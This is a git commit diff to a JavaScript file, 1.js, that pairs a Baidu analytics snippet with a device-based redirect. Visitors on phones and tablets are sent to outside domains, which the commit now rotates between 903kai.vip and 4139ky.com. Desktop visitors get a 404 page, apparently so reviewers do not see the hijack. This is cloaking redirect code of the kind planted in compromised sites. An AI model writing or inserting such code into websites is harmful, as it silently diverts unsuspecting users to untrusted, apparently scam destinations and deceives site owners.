969d62be0a4ecee1e1ee78b778ad5a58d7a7d765
dnshook <62766196+dnshook@users.noreply.github.com>
2023-03-22 21:48:51 +0800

    Update 1.js

--- 1.js
+++ 1.js
@@ -5,9 +5,9 @@ var _hmt = _hmt || [];
   var s = document.getElementsByTagName("script")[0];
   s.parentNode.insertBefore(hm, s);
 })();
-
 if((navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i))) {
-	window.location.href="http://903kai.vip";
+	var arr = ["http://903kai.vip", "http://4139ky.com"];
+	window.location.href = arr[parseInt(Math.random() * arr.length)];
 }else{
 	window.location.href="/404.html";
 }
